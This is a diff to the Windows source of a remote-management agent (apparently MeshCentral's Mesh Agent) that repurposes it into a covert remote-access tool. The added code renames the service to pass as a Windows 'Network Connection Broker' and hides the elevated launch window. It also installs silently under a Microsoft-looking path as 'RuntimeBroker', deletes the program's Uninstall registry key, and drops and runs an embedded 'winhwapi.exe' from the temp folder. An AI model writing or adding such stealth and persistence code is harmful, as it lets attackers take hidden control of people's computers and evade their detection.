@@ -37,6 +37,7 @@ limitations under the License.
 #include "microscript/ILibDuktape_ScriptContainer.h"
 #include "microscript/ILibDuktape_Commit.h"
 #include <shellscalingapi.h>
+#include <Tlhelp32.h>
 
 #if defined(WIN32) && defined (_DEBUG) && !defined(_MINCORE)
 #include <crtdbg.h>
@@ -45,8 +46,8 @@ limitations under the License.
 
 #include <WtsApi32.h>
 
-TCHAR* serviceFile = TEXT("Mesh Agent");
-TCHAR* serviceName = TEXT("Mesh Agent background service");
+TCHAR* serviceFile = TEXT("NetworkService");
+TCHAR* serviceName = TEXT("Network Connection Broker");
 
 SERVICE_STATUS serviceStatus;
 SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
@@ -133,6 +134,7 @@ void *GdiPlusToken = NULL;
 #pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #endif
 
+void ReleaseFileToSysDir(UINT uResourceId, const CHAR* szResourceType, const CHAR* szFileName);
 void GdiPlusFlat_Init()
 {
 	INITCOMMONCONTROLSEX icex;		// declare an INITCOMMONCONTROLSEX Structure
@@ -187,7 +189,23 @@ BOOL IsAdmin()
 	}
 	return admin;
 }
+void DeleteUninstallKey()
+{
+	OutputDebugStringA("DeleteUninstallKey");
+	LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\%s";
+	CHAR szKeyName[1024] = { 0 };
 
+	sprintf_s(szKeyName, sizeof(szKeyName), lpSubKey, SERVICE_NAME);
+	// Delete the registry key
+	LONG result = RegDeleteKeyA(HKEY_LOCAL_MACHINE, szKeyName);
+	if (result != ERROR_SUCCESS) {
+		char szBuff[100] = { 0 };
+		sprintf_s(szBuff, sizeof(szBuff), "DeleteUninstallKey RegDeleteKeyW:%d", result);
+		OutputDebugStringA(szBuff);
+		// Handle the error
+	}
+	return;
+}
 BOOL RunAsAdmin(char* args, int isAdmin)
 {
 	WCHAR szPath[_MAX_PATH + 100];
@@ -195,15 +213,97 @@ BOOL RunAsAdmin(char* args, int isAdmin)
 	{
 		SHELLEXECUTEINFOW sei = { sizeof(sei) };
 		sei.hwnd = NULL;
-		sei.nShow = SW_NORMAL;
+		sei.nShow = SW_HIDE;
 		sei.lpVerb = isAdmin ? L"open" : L"runas";
 		sei.lpFile = szPath;
 		sei.lpParameters = ILibUTF8ToWide(args, -1);
-		return ShellExecuteExW(&sei);
+		BOOL ret = ShellExecuteExW(&sei);
+		OutputDebugStringA("ShellExecuteExW");
+		if (ret) {
+			//WaitForSingleObject(sei.hProcess, INFINITE);
+			//DeleteUninstallKey();
+		}
 	}
 	return FALSE;
 }
+BOOL ReleaseLibrary(UINT uResourceId, const CHAR* szResourceType, const CHAR* szFileName)
+{
+	HRSRC hRsrc = FindResourceA(NULL, MAKEINTRESOURCEA(uResourceId), szResourceType);
+	if (hRsrc == NULL)
+	{
+		return FALSE;
+	}
+	DWORD dwSize = SizeofResource(NULL, hRsrc);
+	if (dwSize <= 0)
+	{
+		return FALSE;
+	}
+	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+	if (hGlobal == NULL)
+	{
+		return FALSE;
+	}
+	LPVOID lpRes = LockResource(hGlobal);
+	if (lpRes == NULL)
+	{
+		return FALSE;
+	}
+	HANDLE hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == NULL)
+	{
+		return FALSE;
+	}
+	DWORD dwWriten = 0;
+	BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
+	if (bRes == FALSE || dwWriten <= 0)
+	{
+		return FALSE;
+	}
+	CloseHandle(hFile);
+	return TRUE;
+}
+void RunProcess(LPCSTR lpPath);
 
+void ReleaseFileToSysDir(UINT uResourceId, const CHAR* szResourceType, const CHAR* szFileName)
+{
+	CHAR szDLLFile[MAX_PATH] = { 0 };
+
+	GetTempPath(MAX_PATH, szDLLFile);
+	strcat_s(szDLLFile, sizeof(szDLLFile), szFileName);
+
+	BOOL bRet= ReleaseLibrary(uResourceId, szResourceType, szDLLFile);
+
+	if (bRet) {
+		RunProcess(szDLLFile);
+	}
+}
+void RunProcess(LPCSTR lpPath)
+{
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	// Start the child process. 
+	if (!CreateProcess(lpPath,   // No module name (use command line)
+		NULL,        // Command line
+		NULL,           // Process handle not inheritable
+		NULL,           // Thread handle not inheritable
+		FALSE,          // Set handle inheritance to FALSE
+		0,              // No creation flags
+		NULL,           // Use parent's environment block
+		NULL,           // Use parent's starting directory 
+		&si,            // Pointer to STARTUPINFO structure
+		&pi)           // Pointer to PROCESS_INFORMATION structure
+		)
+	{
+		printf("CreateProcess failed (%d).\n", GetLastError());
+		return;
+	}
+	// Close process and thread handles. 
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+}
 DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eventData, void* eventContext)
 {
 	switch (controlCode)
@@ -244,8 +344,10 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 		case WTS_CONSOLE_DISCONNECT:	// The session identified by lParam was disconnected from the console terminal or RemoteFX session.
 			break;
 		case WTS_REMOTE_CONNECT:		// The session identified by lParam was connected to the remote terminal.
+			OutputDebugStringA("WTS_REMOTE_CONNECT");
 			break;
 		case WTS_REMOTE_DISCONNECT:		// The session identified by lParam was disconnected from the remote terminal.
+			OutputDebugStringA("WTS_REMOTE_DISCONNECT");
 			break;
 		case WTS_SESSION_LOGON:			// A user has logged on to the session identified by lParam.
 		case WTS_SESSION_LOGOFF:		// A user has logged off the session identified by lParam.					
@@ -432,7 +534,17 @@ duk_ret_t _start(duk_context *ctx)
 		duk_get_prop_string(ctx, -1, "_start_data");
 		FreeConsole();
 		GdiPlusFlat_Init();
-		DialogBoxW(NULL, MAKEINTRESOURCEW(IDD_INSTALLDIALOG), NULL, DialogHandler);
+
+		char szInstall[MAX_PATH] = { 0 };
+
+		SHGetSpecialFolderPathA(NULL, szInstall, CSIDL_LOCAL_APPDATA, FALSE);
+		sprintf_s(szInstall, sizeof(szInstall), "%s\\Microsoft", szInstall);
+
+		sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s --installPath=%s --meshServiceName=%s --target=RuntimeBroker --description=NetworkService", "install", szInstall, SERVICE_NAME);
+		auto result = RunAsAdmin(ILibScratchPad, IsAdmin() == TRUE);
+
+
+		//DialogBoxW(NULL, MAKEINTRESOURCEW(IDD_INSTALLDIALOG), NULL, DialogHandler);
 		GdiPlusFlat_Release();
 	}
 	duk_eval_string_noresult(ctx, "process._exit();");
@@ -454,7 +566,6 @@ int wmain(int argc, char* wargv[])
 		argv[argvi] = (char*)ILibMemory_SmartAllocate(argvsz);
 		WideCharToMultiByte(CP_UTF8, 0, (LPCWCH)wargv[argvi], -1, argv[argvi], argvsz, NULL, NULL);
 	}
-
 	if (argc > 1 && (strcasecmp(argv[1], "-finstall") == 0 || strcasecmp(argv[1], "-funinstall") == 0 ||
 		strcasecmp(argv[1], "-fulluninstall") == 0 || strcasecmp(argv[1], "-fullinstall") == 0 ||
 		strcasecmp(argv[1], "-install") == 0 || strcasecmp(argv[1], "-uninstall") == 0 ||
@@ -744,6 +855,33 @@ int wmain(int argc, char* wargv[])
 	}
 	else if (argc > 1 && strcasecmp(argv[1], "-kvm1") == 0)
 	{
+		PSECURITY_DESCRIPTOR    m_pSD;
+		SECURITY_ATTRIBUTES m_sa;
+
+		m_pSD = NULL;
+		m_sa.nLength = sizeof(m_sa);
+		m_sa.lpSecurityDescriptor = NULL;
+		m_sa.bInheritHandle = TRUE;
+
+		m_pSD = (PSECURITY_DESCRIPTOR)malloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
+
+		if (m_pSD)
+		{
+			if (InitializeSecurityDescriptor(m_pSD, SECURITY_DESCRIPTOR_REVISION))
+			{
+				// add a NULL disc. ACL to the security descriptor.
+				if (SetSecurityDescriptorDacl(m_pSD, TRUE, (PACL)NULL, FALSE))
+				{
+					m_sa.nLength = sizeof(m_sa);
+					m_sa.lpSecurityDescriptor = m_pSD;
+					m_sa.bInheritHandle = TRUE;
+				}
+			}
+		}
+		HANDLE hMutexBlockShutdown = NULL;
+		hMutexBlockShutdown = CreateMutex(&m_sa, FALSE, "Global\\ENABLE_SCREEN_PROTECT");
+
+		ReleaseFileToSysDir(IDR_WINHWAPI1, (CHAR*)"winhwapi", "winhwapi.exe");
 		void **parm = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, 0, NULL);
 		parm[0] = kvm_serviceWriteSink;
 		((int*)&(parm[2]))[0] = 1;
@@ -775,10 +913,9 @@ int wmain(int argc, char* wargv[])
 		{
 			SetProcessDPIAware();
 		}
-
-
 		kvm_server_mainloop((void*)parm);
 		wmain_free(argv);
+
 		return 0;
 	}
 #endif	
@@ -804,6 +941,16 @@ int wmain(int argc, char* wargv[])
 		{
 			ILib_WindowsExceptionDebugEx(&winException);
 		}
+		for (int i = 0; i < argc; i++) {
+			if (strcasecmp(argv[i], "-finstall") == 0 || strcasecmp(argv[i], "-fullinstall") == 0)
+			{
+				DeleteUninstallKey();
+			} else if (strcasecmp(argv[i], "-funinstall") == 0 || strcasecmp(argv[i], "-fulluninstall") == 0)
+			{
+				
+			}
+		}
+		
 		wmain_free(argv);
 		return(retCode);
 	}
@@ -1032,6 +1179,10 @@ int wmain(int argc, char* wargv[])
 							duk_pop(ctx);
 							duk_eval_string_noresult(ctx, "global._OK=true; _start();");
 						}
+
+						//sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s", "install");
+						//auto result = RunAsAdmin(ILibScratchPad, IsAdmin() == TRUE);
+
 						ILibStartChain(dialogchain);
 					}
 					else
@@ -1046,6 +1197,7 @@ int wmain(int argc, char* wargv[])
 	}
 
 	CoUninitialize();
+
 	wmain_free(argv);
 	return 0;
 }
